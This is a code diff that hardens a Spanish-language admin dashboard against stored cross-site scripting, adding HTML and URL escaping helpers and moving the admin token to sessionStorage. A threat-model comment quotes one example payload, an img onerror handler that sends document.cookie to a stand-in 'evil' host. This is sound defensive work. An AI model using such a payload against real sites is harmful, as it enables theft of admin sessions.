@@ -905,8 +905,45 @@
   <script>
     const API_URL = '/api/admin-stats';
     const API_PARTNERS = '/api/admin-partners';
-    let currentToken = localStorage.getItem('babeclub_admin_token') || null;
+    let currentToken = sessionStorage.getItem('babeclub_admin_token') || null;
     let globalCities = [];
+
+    // ── XSS guards ───────────────────────────────────────────────────────────
+    // Threat: a public user can submit hostile strings via the signup form
+    // (e.g. full_name = "<img src=x onerror=fetch('//evil/?'+document.cookie)>").
+    // That value is stored in Supabase, then rendered here when an admin opens
+    // the dashboard. If we interpolate it raw into innerHTML, the browser
+    // executes it inside the admin's session and can read sessionStorage,
+    // including the admin bearer token.
+    //
+    // Rule: every DB-derived string interpolated into an innerHTML template or
+    // a quoted attribute value MUST be wrapped in escHtml(). URLs going into
+    // href/src MUST be wrapped in safeUrl(). Values going into onclick handlers
+    // (a JS-string context) MUST be passed via data-* attributes and read with
+    // this.dataset — escaping alone is not enough there.
+    //
+    // textContent would be structurally safer (fail-safe instead of fail-open),
+    // but the admin SPA's render layer is built on innerHTML template literals;
+    // converting it is a separate, post-launch refactor.
+    function escHtml(s) {
+      if (s === null || s === undefined) return '';
+      return String(s).replace(/[&<>"']/g, c => ({
+        '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;'
+      }[c]));
+    }
+    // Parse with the URL constructor and allow only http/https schemes.
+    // Returns an HTML-escaped, normalized URL, or '' if rejected.
+    // Rejects javascript:, data:, vbscript:, file:, mailto:, malformed strings.
+    function safeUrl(u) {
+      if (!u) return '';
+      try {
+        const parsed = new URL(String(u).trim());
+        if (parsed.protocol === 'http:' || parsed.protocol === 'https:') {
+          return escHtml(parsed.href);
+        }
+      } catch { /* malformed — fall through to '' */ }
+      return '';
+    }
     let globalCategories = [];
     let globalPartners = [];
     let globalMembers = [];
@@ -942,7 +979,7 @@
 
         if (res.ok) {
           currentToken = secret;
-          localStorage.setItem('babeclub_admin_token', currentToken);
+          sessionStorage.setItem('babeclub_admin_token', currentToken);
           authView.style.display = 'none';
           dashShell.style.display = 'block';
           const data = await res.json();
@@ -964,7 +1001,7 @@
     });
 
     document.getElementById('logout-btn').addEventListener('click', () => {
-      localStorage.removeItem('babeclub_admin_token');
+      sessionStorage.removeItem('babeclub_admin_token');
       currentToken = null;
       document.getElementById('admin-secret').value = '';
       dashShell.style.display = 'none';
@@ -1189,8 +1226,8 @@
           ? `<button class="btn btn-sm btn-secondary" onclick="openLowActivityEmail('${partner.id}')" style="font-size:0.75rem;padding:0.25rem 0.625rem;white-space:nowrap;">Enviar email</button>`
           : `<span style="font-size:0.75rem;color:var(--text-muted);">Sin email</span>`;
         tr.innerHTML = `
-          <td><strong>${partner.business_name}</strong></td>
-          <td>${city}</td>
+          <td><strong>${escHtml(partner.business_name)}</strong></td>
+          <td>${escHtml(city)}</td>
           <td>${lastStr}</td>
           <td style="color:${daysColor};font-weight:600;">${daysStr}</td>
           <td>${actionBtn}</td>`;
@@ -1256,7 +1293,7 @@
         const p = globalPartners.find(pp => pp.id === id);
         const name = p ? p.business_name : '-';
         return `<div style="display:flex;justify-content:space-between;font-size:0.875rem;margin-bottom:0.25rem;">
-                  <span>${name}</span>
+                  <span>${escHtml(name)}</span>
                   <strong>${count}</strong>
                 </div>`;
       }).join('');
@@ -1292,17 +1329,17 @@
         // Resolve member name
         const memberObj = log.member_id ? globalMembers.find(m => m.id === log.member_id) : null;
         const memberInfo = memberObj
-          ? `<strong>${memberObj.full_name}</strong><br><span style="font-size: 0.75rem; color: var(--text-muted);">${log.rut_entered || memberObj.rut}</span>`
-          : `<span style="color: var(--text-muted);">${log.rut_entered || '-'}</span>`;
+          ? `<strong>${escHtml(memberObj.full_name)}</strong><br><span style="font-size: 0.75rem; color: var(--text-muted);">${escHtml(log.rut_entered || memberObj.rut)}</span>`
+          : `<span style="color: var(--text-muted);">${escHtml(log.rut_entered || '-')}</span>`;
 
         const isValid = log.result === 'active';
         const resultBadge = isValid
           ? '<span class="badge badge-active">✓ Válido</span>'
-          : `<span class="badge badge-inactive">${log.result === 'not_found' ? 'RUT no encontrado' : log.result === 'inactive' ? 'Socio inactivo' : log.result || 'Rechazado'}</span>`;
+          : `<span class="badge badge-inactive">${log.result === 'not_found' ? 'RUT no encontrado' : log.result === 'inactive' ? 'Socio inactivo' : escHtml(log.result || 'Rechazado')}</span>`;
 
         tr.innerHTML = `
           <td>${dateStr}</td>
-          <td><strong>${bizName}</strong></td>
+          <td><strong>${escHtml(bizName)}</strong></td>
           <td>${memberInfo}</td>
           <td>${resultBadge}</td>
         `;
@@ -1332,9 +1369,9 @@
         const benefitTitle = use.benefits ? use.benefits.title : 'Beneficio Desconocido';
 
         tr.innerHTML = '<td>' + dateStr + '</td>' +
-          '<td><strong>' + partnerName + '</strong></td>' +
-          '<td><strong>' + memberName + '</strong></td>' +
-          '<td><span class="badge badge-active" style="background-color:rgba(59,130,246,0.1);color:var(--primary-color);border-color:rgba(59,130,246,0.2);">' + benefitTitle + '</span></td>';
+          '<td><strong>' + escHtml(partnerName) + '</strong></td>' +
+          '<td><strong>' + escHtml(memberName) + '</strong></td>' +
+          '<td><span class="badge badge-active" style="background-color:rgba(59,130,246,0.1);color:var(--primary-color);border-color:rgba(59,130,246,0.2);">' + escHtml(benefitTitle) + '</span></td>';
         tbody.appendChild(tr);
       });
     }
@@ -1407,8 +1444,14 @@
 
       document.getElementById('drawer-title').textContent = partner.business_name;
 
+      const igHandle = partner.instagram ? String(partner.instagram).replace(/^@/, '').replace(/[^A-Za-z0-9_.]/g, '') : '';
+      const websiteHref = safeUrl(partner.website);
+      const mapsHref = safeUrl(partner.google_maps_url);
+      const logoSrc = safeUrl(partner.logo_url);
+      const valHref = safeUrl(valUrl);
+
       document.getElementById('drawer-body').innerHTML = `
-        ${partner.logo_url ? `<div class="drawer-logo"><img src="${partner.logo_url}" alt="${partner.business_name}"></div>` : ''}
+        ${logoSrc ? `<div class="drawer-logo"><img src="${logoSrc}" alt="${escHtml(partner.business_name)}"></div>` : ''}
 
         <div class="drawer-section">
           <div class="drawer-row">
@@ -1421,15 +1464,15 @@
           </div>
           <div class="drawer-row">
             <span class="drawer-label">Ciudad</span>
-            <span>${cityName}</span>
+            <span>${escHtml(cityName)}</span>
           </div>
           <div class="drawer-row">
             <span class="drawer-label">Categoría</span>
-            <span>${catName}</span>
+            <span>${escHtml(catName)}</span>
           </div>
           <div class="drawer-row">
             <span class="drawer-label">Dirección</span>
-            <span>${partner.address || '-'}</span>
+            <span>${escHtml(partner.address || '-')}</span>
           </div>
           <div class="drawer-row">
             <span class="drawer-label">Registrado</span>
@@ -1453,31 +1496,31 @@
           <h3 class="drawer-section-title">Contacto & Redes</h3>
           <div class="drawer-row">
             <span class="drawer-label">Instagram</span>
-            <span>${partner.instagram ? '<a href="https://instagram.com/' + partner.instagram.replace('@', '') + '" target="_blank" class="drawer-link">' + partner.instagram + '</a>' : '-'}</span>
+            <span>${igHandle ? '<a href="https://instagram.com/' + escHtml(igHandle) + '" target="_blank" rel="noopener noreferrer" class="drawer-link">@' + escHtml(igHandle) + '</a>' : '-'}</span>
           </div>
           <div class="drawer-row">
             <span class="drawer-label">Web</span>
-            <span>${partner.website ? '<a href="' + partner.website + '" target="_blank" class="drawer-link">' + partner.website + '</a>' : '-'}</span>
+            <span>${websiteHref ? '<a href="' + websiteHref + '" target="_blank" rel="noopener noreferrer" class="drawer-link">' + escHtml(partner.website) + '</a>' : '-'}</span>
           </div>
           <div class="drawer-row">
             <span class="drawer-label">Teléfono</span>
-            <span>${partner.phone || '-'}</span>
+            <span>${escHtml(partner.phone || '-')}</span>
           </div>
           <div class="drawer-row">
             <span class="drawer-label">Google Maps</span>
-            <span>${partner.google_maps_url ? '<a href="' + partner.google_maps_url + '" target="_blank" class="drawer-link">Abrir en Mapa</a>' : '-'}</span>
+            <span>${mapsHref ? '<a href="' + mapsHref + '" target="_blank" rel="noopener noreferrer" class="drawer-link">Abrir en Mapa</a>' : '-'}</span>
           </div>
           <div class="drawer-row">
             <span class="drawer-label">Email</span>
-            <span>${partner.email || '-'}</span>
+            <span>${escHtml(partner.email || '-')}</span>
           </div>
         </div>
 
-        ${partner.description ? `<div class="drawer-section"><h3 class="drawer-section-title">Descripción</h3><p class="drawer-description">${partner.description}</p></div>` : ''}
+        ${partner.description ? `<div class="drawer-section"><h3 class="drawer-section-title">Descripción</h3><p class="drawer-description">${escHtml(partner.description)}</p></div>` : ''}
 
         <div class="drawer-section">
           <h3 class="drawer-section-title">Portal de Validación</h3>
-          <a href="${valUrl}" target="_blank" class="drawer-val-link">
+          <a href="${valHref}" target="_blank" rel="noopener noreferrer" class="drawer-val-link">
             <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
               <path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"></path>
               <polyline points="15 3 21 3 21 9"></polyline>
@@ -1485,7 +1528,7 @@
             </svg>
             Abrir Portal de Validación
           </a>
-          <div class="drawer-token">Token: <code>${partner.validation_token}</code></div>
+          <div class="drawer-token">Token: <code>${escHtml(partner.validation_token)}</code></div>
         </div>
 
         <div id="partner-benefits-section" class="drawer-section">
@@ -1497,7 +1540,7 @@
           <h3 class="drawer-section-title">Editar Empresa</h3>
           <div style="margin-bottom:0.875rem;">
             <label class="edit-label">Nombre</label>
-            <input type="text" id="ep-name" class="form-control" value="${partner.business_name.replace(/"/g, '&quot;')}">
+            <input type="text" id="ep-name" class="form-control" value="${escHtml(partner.business_name)}">
           </div>
           <div style="display:grid;grid-template-columns:1fr 1fr;gap:0.75rem;margin-bottom:0.875rem;">
             <div>
@@ -1519,53 +1562,53 @@
             <div>
               <label class="edit-label">Ciudad</label>
               <select id="ep-city" class="form-control">
-                ${globalCities.map(c => `<option value="${c.id}" ${c.id === partner.city_id ? 'selected' : ''}>${c.name}</option>`).join('')}
+                ${globalCities.map(c => `<option value="${escHtml(c.id)}" ${c.id === partner.city_id ? 'selected' : ''}>${escHtml(c.name)}</option>`).join('')}
               </select>
             </div>
             <div>
               <label class="edit-label">Categoría</label>
               <select id="ep-category" class="form-control">
-                ${globalCategories.map(c => `<option value="${c.id}" ${c.id === partner.category_id ? 'selected' : ''}>${c.name}</option>`).join('')}
+                ${globalCategories.map(c => `<option value="${escHtml(c.id)}" ${c.id === partner.category_id ? 'selected' : ''}>${escHtml(c.name)}</option>`).join('')}
               </select>
             </div>
           </div>
           <div style="margin-bottom:0.875rem;">
             <label class="edit-label">Dirección</label>
-            <input type="text" id="ep-address" class="form-control" value="${(partner.address || '').replace(/"/g, '&quot;')}">
+            <input type="text" id="ep-address" class="form-control" value="${escHtml(partner.address || '')}">
           </div>
           <div style="display:grid;grid-template-columns:1fr 1fr;gap:0.75rem;margin-bottom:0.875rem;">
             <div>
               <label class="edit-label">Teléfono</label>
-              <input type="text" id="ep-phone" class="form-control" value="${(partner.phone || '').replace(/"/g, '&quot;')}">
+              <input type="text" id="ep-phone" class="form-control" value="${escHtml(partner.phone || '')}">
             </div>
             <div>
               <label class="edit-label">Email</label>
-              <input type="text" id="ep-email" class="form-control" value="${(partner.email || '').replace(/"/g, '&quot;')}">
+              <input type="text" id="ep-email" class="form-control" value="${escHtml(partner.email || '')}">
             </div>
           </div>
           <div style="display:grid;grid-template-columns:1fr 1fr;gap:0.75rem;margin-bottom:0.875rem;">
             <div>
               <label class="edit-label">Instagram</label>
-              <input type="text" id="ep-instagram" class="form-control" value="${(partner.instagram || '').replace(/"/g, '&quot;')}">
+              <input type="text" id="ep-instagram" class="form-control" value="${escHtml(partner.instagram || '')}">
             </div>
             <div>
               <label class="edit-label">Página Web</label>
-              <input type="text" id="ep-website" class="form-control" value="${(partner.website || '').replace(/"/g, '&quot;')}">
+              <input type="text" id="ep-website" class="form-control" value="${escHtml(partner.website || '')}">
             </div>
           </div>
           <div style="margin-bottom:0.875rem;">
             <label class="edit-label">Logo URL</label>
-            <input type="text" id="ep-logo" class="form-control" value="${(partner.logo_url || '').replace(/"/g, '&quot;')}">
+            <input type="text" id="ep-logo" class="form-control" value="${escHtml(partner.logo_url || '')}">
           </div>
           <div style="margin-bottom:0.875rem;">
             <label class="edit-label">Google Maps URL</label>
-            <input type="text" id="ep-google-maps" class="form-control" value="${(partner.google_maps_url || '').replace(/"/g, '&quot;')}">
+            <input type="text" id="ep-google-maps" class="form-control" value="${escHtml(partner.google_maps_url || '')}">
           </div>
           <div style="margin-bottom:1.25rem;">
             <label class="edit-label">Descripción</label>
-            <textarea id="ep-description" class="form-control" rows="3" style="resize:vertical;">${partner.description || ''}</textarea>
+            <textarea id="ep-description" class="form-control" rows="3" style="resize:vertical;">${escHtml(partner.description || '')}</textarea>
           </div>
-          <button class="btn btn-sm" id="ep-save-btn" style="width:100%;" onclick="savePartnerEdit('${partner.id}')">Guardar Cambios</button>
+          <button class="btn btn-sm" id="ep-save-btn" style="width:100%;" onclick="savePartnerEdit('${escHtml(partner.id)}')">Guardar Cambios</button>
           <div id="ep-msg" style="margin-top:0.75rem;font-size:0.8125rem;min-height:1.25rem;"></div>
         </div>
         ` : ''}
@@ -1589,7 +1632,7 @@
       const date = new Date(member.created_at).toLocaleDateString('es-CL');
       const statusBadge = member.status === 'active'
         ? '<span class="badge badge-active">Activo</span>'
-        : '<span class="badge badge-pending">' + member.status + '</span>';
+        : '<span class="badge badge-pending">' + escHtml(member.status) + '</span>';
       const geo = [member.region, member.comuna].filter(Boolean).join(' / ') || '-';
 
       // Count this member's validations
@@ -1615,19 +1658,19 @@
           </div>
           <div class="drawer-row">
             <span class="drawer-label">RUT</span>
-            <span><strong>${member.rut}</strong></span>
+            <span><strong>${escHtml(member.rut)}</strong></span>
           </div>
           <div class="drawer-row">
             <span class="drawer-label">Email</span>
-            <span>${member.email || '-'}</span>
+            <span>${escHtml(member.email || '-')}</span>
           </div>
           <div class="drawer-row">
             <span class="drawer-label">Teléfono</span>
-            <span>${member.phone || '-'}</span>
+            <span>${escHtml(member.phone || '-')}</span>
           </div>
           <div class="drawer-row">
             <span class="drawer-label">Región / Comuna</span>
-            <span>${geo}</span>
+            <span>${escHtml(geo)}</span>
           </div>
           <div class="drawer-row">
             <span class="drawer-label">Fecha registro</span>
@@ -1655,7 +1698,7 @@
         <div class="drawer-section">
           <h3 class="drawer-section-title">Comercios Usados</h3>
           <div class="drawer-chips">
-            ${visitedBizNames.map(name => `<span class="drawer-chip">${name}</span>`).join('')}
+            ${visitedBizNames.map(name => `<span class="drawer-chip">${escHtml(name)}</span>`).join('')}
           </div>
         </div>` : ''}
 
@@ -1693,19 +1736,19 @@
           </div>
           <div style="margin-bottom:1.25rem;">
             <label class="edit-label">Email MercadoPago (opcional)</label>
-            <input type="email" id="edit-mp-email" class="form-control" value="${member.mp_email || ''}" placeholder="Si difiere del email principal">
+            <input type="email" id="edit-mp-email" class="form-control" value="${escHtml(member.mp_email || '')}" placeholder="Si difiere del email principal">
           </div>
-          <button class="btn btn-sm" id="edit-save-btn" style="width:100%;" onclick="saveMemberEdit('${member.id}')">Guardar Cambios</button>
+          <button class="btn btn-sm" id="edit-save-btn" style="width:100%;" onclick="saveMemberEdit('${escHtml(member.id)}')">Guardar Cambios</button>
           <div id="edit-msg" style="margin-top:0.75rem;font-size:0.8125rem;min-height:1.25rem;"></div>
         </div>
 
         ${member.email ? `
         <div class="drawer-section" style="border-bottom:none;padding-top:0;">
-          <button class="btn btn-sm btn-secondary" id="sync-mp-btn" style="width:100%;margin-bottom:0.75rem;background:#009ee3;color:white;border-color:#009ee3;" onclick="syncMemberMP('${member.id}', '${member.email}')">
+          <button class="btn btn-sm btn-secondary" id="sync-mp-btn" style="width:100%;margin-bottom:0.75rem;background:#009ee3;color:white;border-color:#009ee3;" data-member-id="${escHtml(member.id)}" data-member-email="${escHtml(member.email)}" onclick="syncMemberMP(this.dataset.memberId, this.dataset.memberEmail)">
             <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="margin-right:6px;vertical-align:middle;"><polyline points="23 4 23 10 17 10"></polyline><polyline points="1 20 1 14 7 14"></polyline><path d="M3.51 9a9 9 0 0 1 14.85-3.36L23 10M1 14l4.64 4.36A9 9 0 0 0 20.49 15"></path></svg>
             Sincronizar con MercadoPago
           </button>
-          <button class="btn btn-sm btn-secondary" id="welcome-email-btn" style="width:100%;" onclick="sendWelcomeEmail('${member.id}')">
+          <button class="btn btn-sm btn-secondary" id="welcome-email-btn" style="width:100%;" onclick="sendWelcomeEmail('${escHtml(member.id)}')">
             <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="margin-right:6px;vertical-align:middle;"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path><polyline points="22,6 12,13 2,6"></polyline></svg>
             Reenviar Email de Bienvenida
           </button>
@@ -1728,8 +1771,8 @@
       const citySelect = document.getElementById('p-city');
       const catSelect = document.getElementById('p-category');
 
-      citySelect.innerHTML = '<option value="">Selecciona...</option>' + globalCities.map(c => `<option value="${c.id}">${c.name}</option>`).join('');
-      catSelect.innerHTML = '<option value="">Selecciona...</option>' + globalCategories.map(c => `<option value="${c.id}">${c.name}</option>`).join('');
+      citySelect.innerHTML = '<option value="">Selecciona...</option>' + globalCities.map(c => `<option value="${escHtml(c.id)}">${escHtml(c.name)}</option>`).join('');
+      catSelect.innerHTML = '<option value="">Selecciona...</option>' + globalCategories.map(c => `<option value="${escHtml(c.id)}">${escHtml(c.name)}</option>`).join('');
 
       partnerModal.classList.add('active');
     }
@@ -1766,16 +1809,16 @@
         const featureBadge = partner.featured ? '⭐ Sí' : '-';
         const cityName = resolveName(globalCities, partner.city_id);
         tr.innerHTML = `
-          <td><strong>${partner.business_name}</strong></td>
-          <td>${cityName}</td>
+          <td><strong>${escHtml(partner.business_name)}</strong></td>
+          <td>${escHtml(cityName)}</td>
           <td>${statusBadge}</td>
           <td>${featureBadge}</td>
           <td>${date}</td>
           <td class="col-actions">
-            <button class="icon-btn" onclick="openPartnerDrawer('${partner.id}')" title="Ver detalle">
+            <button class="icon-btn" onclick="openPartnerDrawer('${escHtml(partner.id)}')" title="Ver detalle">
               <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="3"></circle><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path></svg>
             </button>
-            <button class="icon-btn" onclick="openPartnerDrawer('${partner.id}', true)" title="Editar">
+            <button class="icon-btn" onclick="openPartnerDrawer('${escHtml(partner.id)}', true)" title="Editar">
               <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M11 4H4a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-7"></path><path d="M18.5 2.5a2.121 2.121 0 0 1 3 3L12 15l-4 1 1-4 9.5-9.5z"></path></svg>
             </button>
           </td>
@@ -1822,14 +1865,14 @@
 
         tr.innerHTML = `
           <td>${date}</td>
-          <td><strong>${member.full_name}</strong></td>
-          <td>${member.rut}</td>
-          <td>${member.email || '-'}</td>
-          <td>${geo}</td>
+          <td><strong>${escHtml(member.full_name)}</strong></td>
+          <td>${escHtml(member.rut)}</td>
+          <td>${escHtml(member.email || '-')}</td>
+          <td>${escHtml(geo)}</td>
           <td>${expHtml}</td>
-          <td><span class="badge ${badgeClass}">${member.status}</span></td>
+          <td><span class="badge ${badgeClass}">${escHtml(member.status)}</span></td>
           <td style="text-align:center;">
-            <button class="icon-btn" onclick="openMemberDrawer('${member.id}')" title="Ver detalle">
+            <button class="icon-btn" onclick="openMemberDrawer('${escHtml(member.id)}')" title="Ver detalle">
               <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                 <circle cx="12" cy="12" r="3"></circle>
                 <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
@@ -1882,8 +1925,8 @@
 
         const tr = document.createElement('tr');
         tr.innerHTML = `
-          <td><strong>${member.full_name}</strong></td>
-          <td>${member.email || '-'}</td>
+          <td><strong>${escHtml(member.full_name)}</strong></td>
+          <td>${escHtml(member.email || '-')}</td>
           <td>${expStr}</td>
           <td><span class="badge ${statusClass}">${statusLabel}</span></td>
         `;
@@ -2290,26 +2333,25 @@
         const activeBadge = b.active
           ? '<span class="badge badge-active" style="font-size:0.7rem;padding:0.15rem 0.5rem;">Activo</span>'
           : '<span class="badge badge-inactive" style="font-size:0.7rem;padding:0.15rem 0.5rem;">Inactivo</span>';
-        const safeTitle = b.title.replace(/'/g, "\\'").replace(/"/g, '&quot;');
         return `
-          <div class="benefit-card" id="benefit-card-${b.id}">
+          <div class="benefit-card" id="benefit-card-${escHtml(b.id)}">
             <div class="benefit-card-header">
               <div>
-                <span class="benefit-title">${b.title}</span>
-                ${discount ? `<span class="benefit-discount">${discount}</span>` : ''}
+                <span class="benefit-title">${escHtml(b.title)}</span>
+                ${discount ? `<span class="benefit-discount">${escHtml(discount)}</span>` : ''}
               </div>
               <div class="benefit-card-actions">
                 ${activeBadge}
-                <button class="icon-btn" onclick="editBenefit('${b.id}')" title="Editar beneficio">
+                <button class="icon-btn" onclick="editBenefit('${escHtml(b.id)}')" title="Editar beneficio">
                   <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M11 4H4a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-7"></path><path d="M18.5 2.5a2.121 2.121 0 0 1 3 3L12 15l-4 1 1-4 9.5-9.5z"></path></svg>
                 </button>
-                <button class="icon-btn icon-btn-danger" onclick="deleteBenefit('${b.id}', '${safeTitle}')" title="Eliminar beneficio">
+                <button class="icon-btn icon-btn-danger" data-benefit-id="${escHtml(b.id)}" data-benefit-title="${escHtml(b.title)}" onclick="deleteBenefit(this.dataset.benefitId, this.dataset.benefitTitle)" title="Eliminar beneficio">
                   <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="3 6 5 6 21 6"></polyline><path d="M19 6l-1 14a2 2 0 0 1-2 2H8a2 2 0 0 1-2-2L5 6"></path><path d="M10 11v6"></path><path d="M14 11v6"></path><path d="M9 6V4a1 1 0 0 1 1-1h4a1 1 0 0 1 1 1v2"></path></svg>
                 </button>
               </div>
             </div>
-            ${b.description ? `<p class="benefit-desc">${b.description}</p>` : ''}
-            ${b.conditions ? `<p class="benefit-conditions">${b.conditions}</p>` : ''}
+            ${b.description ? `<p class="benefit-desc">${escHtml(b.description)}</p>` : ''}
+            ${b.conditions ? `<p class="benefit-conditions">${escHtml(b.conditions)}</p>` : ''}
           </div>`;
       }).join('');
 
@@ -2332,7 +2374,7 @@
         <div class="benefit-form">
           <div style="margin-bottom:0.75rem;">
             <label class="edit-label">Título *</label>
-            <input type="text" id="bf-title" class="form-control" value="${(b.title || '').replace(/"/g, '&quot;')}" placeholder="Ej: 10% en toda la carta">
+            <input type="text" id="bf-title" class="form-control" value="${escHtml(b.title || '')}" placeholder="Ej: 10% en toda la carta">
           </div>
           <div style="display:grid;grid-template-columns:1fr 1fr;gap:0.75rem;margin-bottom:0.75rem;">
             <div>
@@ -2353,11 +2395,11 @@
           </div>
           <div style="margin-bottom:0.75rem;">
             <label class="edit-label">Descripción</label>
-            <textarea id="bf-description" class="form-control" rows="2" style="resize:vertical;" placeholder="Detalle del beneficio...">${b.description || ''}</textarea>
+            <textarea id="bf-description" class="form-control" rows="2" style="resize:vertical;" placeholder="Detalle del beneficio...">${escHtml(b.description || '')}</textarea>
           </div>
           <div style="margin-bottom:0.75rem;">
             <label class="edit-label">Condiciones</label>
-            <textarea id="bf-conditions" class="form-control" rows="2" style="resize:vertical;" placeholder="Restricciones, horarios, etc.">${b.conditions || ''}</textarea>
+            <textarea id="bf-conditions" class="form-control" rows="2" style="resize:vertical;" placeholder="Restricciones, horarios, etc.">${escHtml(b.conditions || '')}</textarea>
           </div>
           <div style="display:grid;grid-template-columns:1fr 1fr;gap:0.75rem;margin-bottom:0.75rem;">
             <div>
@@ -2378,7 +2420,7 @@
             </select>
           </div>` : ''}
           <div style="display:flex;gap:0.5rem;margin-top:0.25rem;">
-            <button class="btn btn-sm" style="width:auto;" id="bf-save-btn" onclick="${benefit ? `saveBenefitEdit('${benefit.id}')` : 'saveBenefitAdd()'}">
+            <button class="btn btn-sm" style="width:auto;" id="bf-save-btn" onclick="${benefit ? `saveBenefitEdit('${escHtml(benefit.id)}')` : 'saveBenefitAdd()'}">
               ${benefit ? 'Guardar Cambios' : 'Añadir Beneficio'}
             </button>
             <button class="btn btn-sm btn-secondary" style="width:auto;" onclick="cancelBenefitForm()">Cancelar</button>
@@ -2837,7 +2879,7 @@ Algunas razones comunes por las que los socios no llegan:
       if (!sel) return;
       const regions = [...new Set(globalMembers.filter(m => m.region).map(m => m.region))].sort();
       sel.innerHTML = regions.length
-        ? regions.map(r => `<option value="${r}">${r}</option>`).join('')
+        ? regions.map(r => `<option value="${escHtml(r)}">${escHtml(r)}</option>`).join('')
         : '<option value="">Sin regiones disponibles</option>';
     }
 
@@ -2890,9 +2932,9 @@ Algunas razones comunes por las que los socios no llegan:
       }
       container.innerHTML = withEmail.slice(0, 60).map(m => `
         <label style="display:flex;align-items:center;gap:0.5rem;padding:0.5rem 0.75rem;border-bottom:1px solid var(--border-color);cursor:pointer;font-size:0.875rem;">
-          <input type="checkbox" value="${m.id}" onchange="updateAudienceCount()">
-          <span style="flex:1;min-width:0;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;">${m.full_name}</span>
-          <span style="color:var(--text-muted);font-size:0.75rem;flex-shrink:0;">${m.email}</span>
+          <input type="checkbox" value="${escHtml(m.id)}" onchange="updateAudienceCount()">
+          <span style="flex:1;min-width:0;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;">${escHtml(m.full_name)}</span>
+          <span style="color:var(--text-muted);font-size:0.75rem;flex-shrink:0;">${escHtml(m.email)}</span>
         </label>`).join('');
     }
 
@@ -3039,7 +3081,7 @@ Algunas razones comunes por las que los socios no llegan:
       const sel = document.getElementById('a-city-select');
       if (!sel) return;
       sel.innerHTML = globalCities.length
-        ? globalCities.map(c => `<option value="${c.id}">${c.name}</option>`).join('')
+        ? globalCities.map(c => `<option value="${escHtml(c.id)}">${escHtml(c.name)}</option>`).join('')
         : '<option value="">Sin ciudades disponibles</option>';
     }
 
@@ -3088,8 +3130,8 @@ Algunas razones comunes por las que los socios no llegan:
       }
       container.innerHTML = withEmail.map(p => `
         <label style="display:flex;align-items:center;gap:0.5rem;padding:0.5rem 0.75rem;border-bottom:1px solid var(--border-color);cursor:pointer;font-size:0.875rem;">
-          <input type="checkbox" value="${p.id}" onchange="updatePartnerAudienceCount()" style="flex-shrink:0;">
-          <span style="flex:1;">${p.business_name}</span>
+          <input type="checkbox" value="${escHtml(p.id)}" onchange="updatePartnerAudienceCount()" style="flex-shrink:0;">
+          <span style="flex:1;">${escHtml(p.business_name)}</span>
         </label>`).join('');
     }
 
